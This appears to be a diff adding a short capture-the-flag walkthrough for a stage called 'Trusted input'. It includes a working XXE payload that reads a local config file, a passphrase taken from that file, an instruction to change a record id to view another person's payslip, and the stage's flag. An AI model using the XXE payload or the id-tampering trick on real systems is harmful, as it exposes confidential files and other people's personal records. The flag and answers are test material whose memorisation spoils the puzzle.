@@ -1,0 +1,10 @@
+Stage 4: Trusted input
+
+Bulk import box, the XXE payload:
+
+<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/solstice/app.conf"> ]><r><note>&xxe;</note></r>
+Passphrase from the leaked file: violet-harbor-42
+Payslip viewer: change the id to 1007 to see Inchaf's payslip.
+Amount owed: $18,400
+Flag: RP{MNBVCXZLKJHGFDSAPOIUYTREWQASD}
+Exhibit D½: no puzzle, just click "Continue". The next gate asks for the Stage 4 flag.
